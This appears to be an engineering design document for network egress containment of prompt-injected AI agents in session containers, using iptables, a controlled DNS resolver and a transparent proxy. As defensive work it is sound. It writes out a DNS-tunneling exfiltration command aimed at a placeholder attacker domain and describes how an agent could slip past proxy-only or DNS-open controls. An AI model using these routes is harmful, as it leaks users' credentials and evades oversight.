---
title: Egress control for session containers (Gap 1)
description: Default-deny outbound egress for session containers via a gateway middlebox — iptables floor, controlled DNS, and a transparent allowlisting proxy — delivered in one sequential PR.
issue: https://linear.app/shipit-ai/issue/SHI-90
---

# Egress control for session containers

This is the detailed design for **Gap 1** of [agent containment](./plan.md) (SHI-90):
default-deny outbound network egress for session containers, so a prompt-injected
agent cannot exfiltrate credentials (its own OAuth token, MCP tokens, the brokered
GitHub PAT) to an arbitrary host. Per Anthropic's
[How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude),
once approval friction is removed this is the load-bearing environment-layer defense.

It depends on and composes with **SHI-129** (`docs/201-container-api-trust-boundary/`):
that work default-denies the orchestrator API for container-origin requests, which is
what makes egress *settings* (the global toggle, the allowlist) safe to mutate from the
browser — the contained agent can't reach those routes to loosen its own containment.

## Why the current PR is not yet a real control

The first cut (PR for SHI-90) injects `HTTP_PROXY`/`HTTPS_PROXY` into the container and
runs an allowlisting forward proxy in the orchestrator. That is a **policy engine without
enforcement**: the env vars are a convention only cooperative clients honor. The actual
adversary — an injected agent — opens a raw socket that ignores `HTTP_PROXY` and reaches
the internet directly, because the container sits on a normal bridge with full NAT. So the
proxy-by-env-var state contains nothing against the stated threat. The enforcement has to
happen at the **network layer**, below the agent's control.

## Research: how Anthropic's reference devcontainer does it

The reference `.devcontainer/init-firewall.sh` in `anthropics/claude-code` is **pure
`iptables` + `ipset`, no proxy**:

- Default-deny: `iptables -P INPUT/FORWARD/OUTPUT DROP`.
- An `ipset` (`allowed-domains`, `hash:net`) of **destination IPs** is the allowlist,
  matched by `iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT`.
- The ipset is populated **once at init** by resolving each allowed hostname
  (`dig +noall +answer A "$domain"`); GitHub is added via its published CIDR ranges
  (`gh api meta | jq '(.web + .api + .git)[]' | aggregate`).
- A self-test confirms enforcement: `curl example.com` must fail, `curl api.github.com/zen`
  must succeed.

### The DNS part — and why we must do more than copy it

DNS is allowed **wide open, to any resolver**:

```
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT  -p udp --sport 53 -j ACCEPT
```

This is structural, not an oversight: you can't resolve the allowlist without DNS, and
`iptables` can't parse DNS query *names* (it only sees "UDP to :53"), so the rule can't be
scoped to allowed domains. The consequences are the two things this design must fix:

1. **DNS tunneling is unmitigated.** With port 53 open to any host, an injected agent
   exfiltrates with zero HTTP: `dig $(secret | base64).attacker.com` routes the secret to
   *attacker.com*'s authoritative nameserver via the recursive resolver. The ipset never
   sees it. For a solo-dev devcontainer that is an accepted risk-reduction tradeoff; for
   ShipIt's threat model (credential exfil is the *named* threat) it is **disqualifying**.
2. **Resolve-at-init means stale IPs + a CDN leak.** CDN-fronted hosts (npm, Anthropic)
   rotate IPs, so the pinned ipset breaks long sessions; and an allowed Fastly/Cloudflare
   IP also fronts other sites reachable via SNI on the same IP.

Both weaknesses trace to **not controlling DNS**. That is the correction at the center of
this design.

## Architecture: netns-sidecar enforcement (resolved)

The agent container runs with `CapDrop: ["ALL"]` (no `NET_ADMIN`) and, since SHI-31, as a
non-root user — by design, and we keep it that way. So the firewall/DNS/proxy **cannot and
must not** be administered *by* the agent. But the controls still apply *inside the agent's
own network namespace* — installed from the outside by a trusted, orchestrator-launched
**sidecar that shares the agent's netns** and holds the capability the agent lacks:

```
docker run --network container:<agentId> --cap-add NET_ADMIN  egress-sidecar
       │  (shares the agent container's network namespace; agent itself has no NET_ADMIN)
       ▼
inside the agent netns:
   Tier A  installer (short-lived): iptables default-deny (OUTPUT DROP) + ipset allow-set,
           then exits — rules persist in the netns; the agent can't undo them.
   Tier B  resolver (long-lived sidecar): the only reachable DNS; answers allowlisted names
           only, drives the ipset with the IPs it returns.
   Tier C  transparent proxy (long-lived sidecar): listens on loopback; iptables REDIRECTs
           OUTPUT :443/:53 to it, EXCEPT traffic owned by the sidecar's uid
           (`-m owner --uid-owner`), so the proxy's own egress isn't re-redirected.
```

**Why this over an `internal` network + a separate multi-homed gateway container** (the
earlier sketch): it needs **no second network, no routing/default-gateway changes, and no
cross-container attribution** — everything lives in one netns, so "the agent" and "the
enforcement point" are the same kernel network stack. The agent still can't bypass it (no
`NET_ADMIN` to flush rules; the loopback proxy + owner-match is the istio/cilium-init
pattern), and it composes cleanly A→B→C as sidecars added to the same netns. SHI-31's
non-root agent makes the owner-match exemption unambiguous (agent uid ≠ sidecar uid).

Key properties:
- **Un-bypassable without NET_ADMIN.** A raw socket from the agent is still subject to the
  netns iptables `OUTPUT` policy; there is nothing to unset and no `HTTP_PROXY` to ignore.
- **Transparent.** No env vars in the agent container; REDIRECT happens in the netns.
- **Resolve-before-deny ordering.** The installer fetches `gh api meta` CIDRs and resolves
  allowlisted hostnames *before* setting the `OUTPUT DROP` policy (chicken-and-egg: once
  default-deny is up, the installer itself couldn't reach `api.github.com`). The GitHub
  CIDR fetch is done **orchestrator-side** (it holds the brokered token) and passed in.

## The three tiers (all shipped, sequentially, in one PR)

| Tier | Mechanism | DNS tunneling | CDN / staleness | Allow-once UX | Phase-2 identity hook |
|------|-----------|:---:|:---:|:---:|:---:|
| **A** | iptables default-deny + ipset (Anthropic-style) | ❌ open | ❌ stale / leak | ❌ | ❌ |
| **B** | + controlled resolver that answers only allowlisted names **and** populates the ipset with the IPs it just returned | ✅ closed | ✅ fresh | ⚠️ clunky | ❌ |
| **C** | + transparent SNI/CONNECT proxy for HTTPS | ✅ | ✅ | ✅ | ✅ |

- **Tier A** establishes the un-bypassable floor: internal network, gateway, default-deny,
  ipset matched on destination IP. Steal Anthropic's proven patterns — `gh api meta` CIDR
  for GitHub, resolve-and-pin, the `example.com`-must-fail self-test.
- **Tier B** is the minimum that actually satisfies our exfil threat model. The gateway
  runs the only resolver the container can reach (port 53 allowed *only* to the gateway);
  it refuses/logs non-allowlisted names (killing DNS tunneling) and, on each allowed
  resolution, inserts the returned IPs into the ipset (killing staleness — the ipset always
  matches the live answer). This is the DNS correction over Anthropic's reference.
- **Tier C** adds the transparent proxy for L7: hostname-level HTTPS policy that survives
  shared CDN IPs, the **allow-once / add-to-allowlist** interactive flow, per-host
  observability, and the hook for the Phase-2 identity-validating proxy (verify a request
  carries *this* user's token, not an attacker's). The allowlist matcher already written
  (`egress-allowlist.ts`) is reused verbatim; what changes is that traffic reaches it via
  the gateway route rather than an env var.

### Why one PR, sequentially (and how it stays reviewable)

Tiers A→B→C are not independently *useful* as shipped increments — Tier A alone still
leaks via DNS (the very channel this issue exists to close), so shipping it as "egress
control" would advertise a guarantee we don't yet provide. The tiers also share one
substrate (the gateway container, the internal-network topology, the session attribution),
so splitting them across PRs would mean landing and reverting scaffolding. We therefore
deliver **all three in one PR**, as a sequence of **self-contained commits — one per tier,
each independently green** (build + tests) — so review and `git bisect` stay tractable even
though the unit of *enablement* is the whole thing. The PR closes SHI-90; nothing claims
egress is contained until Tier C lands. The Phase-2 identity-validating proxy remains a
separate follow-up (it builds on the Tier C hook).

## Settings & UX (browser-only, SHI-129-protected)

All egress configuration is mutated **only from the browser**. SHI-129's guard is
default-deny per route: a route is reachable from a container only if it declares
`config: { containerAccessible: true }`, so the egress settings routes are protected
simply by **not** setting that flag — the contained agent cannot reach them to loosen its
own containment. High-value ones may additionally be listed in `HARD_DENY_PREFIXES`
(`isHardDeniedGlobal`) as a backstop, but that is belt-and-suspenders, not the mechanism.
Stored orchestrator-side alongside MCP servers / secrets.

- **Global toggle (default ON, fail-secure).** Two modes for the trusted user:
  *Contained* (default-deny + allowlist + prompts) and *Open* (unrestricted egress, no
  prompts — "stop babysitting, let it work"). An unreadable/missing setting resolves to
  *Contained*. The toggle applies at the session's next container start (egress is a
  creation-time network-topology choice; ShipIt recycles containers routinely), and the UI
  states that rather than implying an instant effect.
- **Per-session override.** "Allow this session to also reach `X`" — the smaller-blast-radius
  version of the global switch, matching the real "I'm debugging one thing" need.
- **Allow-once / add-to-allowlist on block.** When the gateway denies a host, **deny fast**
  (no held sockets) and surface an inline **blocked-egress card** (`host`, allow-once /
  add-to-allowlist / dismiss); the agent retries once the host is permitted. We deliberately
  do *not* hold the TCP connection waiting for a human (client connect-timeouts + prompt
  fatigue + it stalls the turn against §5). "Allow once" is a short-lived grant the next
  attempt consumes. Like other transcript cards, the blocked-egress card must be **persisted**
  (it has a place in scrollback), per the CLAUDE.md side-channel-card rule.

## Allowlist composition

Reuses `egress-allowlist.ts` (already merged on the SHI-90 branch):

- Base list (`EGRESS_DEFAULT_ALLOWLIST`): agent APIs, `.github.com` / `.githubusercontent.com`,
  npm/yarn/pypi.
- Operator extras (`SESSION_EGRESS_ALLOWLIST`) + the browser-managed allowlist above.
- **Live MCP hosts** from the credential store (configured HTTP servers + OAuth providers).
  Post-SHI-129 the agent can no longer add an MCP server from inside the container, so this
  derived set is now user-controlled and tamper-proof — the sub-hole flagged earlier is
  closed.
- GitHub resolved via `gh api meta` CIDR ranges at the gateway (Anthropic's pattern), not
  per-name resolution.

## Relationship to the env-var proxy already on the branch

`egress-proxy.ts` (explicit `HTTP_PROXY` forward proxy) and the `buildEnv` proxy-env
injection were the testable first slice. Under this design the **allowlist matcher is kept**
and the **proxy becomes transparent at the gateway**; the `HTTP_PROXY`/`HTTPS_PROXY`/
`NO_PROXY` env injection is **removed** (no longer needed and never an enforcement boundary).
The `SESSION_EGRESS_PROXY` env flag is superseded by the browser global toggle (env remains
as an operator default / fail-secure floor).

## Key files (planned)

- Gateway provisioning + internal-network topology — `container-lifecycle.ts`,
  `session-container.ts` (extend the existing per-session `createNetwork` to `Internal: true`
  + gateway attachment).
- `egress-gateway.*` (new) — the middlebox: iptables/ipset setup, controlled resolver,
  transparent proxy. NET_ADMIN lives here, never in the agent container.
- `egress-allowlist.ts` (reused) — host matcher + composition.
- Settings store field + browser-only routes (default-protected by *not* setting
  `containerAccessible`; optionally add to `HARD_DENY_PREFIXES` as a backstop; golden
  route-table test updated) — `api-routes-*.ts`, `api-container-guard.ts`.
- Blocked-egress card — persisted transcript card (see CLAUDE.md side-channel-card rule):
  `chat-card-persistence.ts`, `chat-history.ts`, client `visual-elements.ts`.

## References

- `anthropics/claude-code` `.devcontainer/init-firewall.sh` (iptables/ipset reference; the
  DNS-open tradeoff).
- `docs/201-container-api-trust-boundary/` (SHI-129) — the browser↔container API boundary
  this relies on.
- `SECURITY-MODEL.md` → "Agent and container containment" / "Known limitations".
- [How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude).
